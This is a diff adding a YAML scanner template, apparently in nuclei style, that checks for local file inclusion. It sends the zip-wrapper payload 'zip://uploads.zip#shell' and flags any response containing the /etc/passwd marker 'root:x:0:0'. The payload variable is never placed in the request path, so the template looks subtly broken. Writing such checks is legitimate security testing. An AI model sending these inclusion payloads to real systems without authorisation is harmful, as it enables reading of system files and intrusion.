@@ -1,0 +1,20 @@
+id: lfi5-067
+name: 'Wrapper zip via doc'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - wrapper
+description: 'Reads file via zip wrapper'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      doc:
+        - 'zip://uploads.zip#shell'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
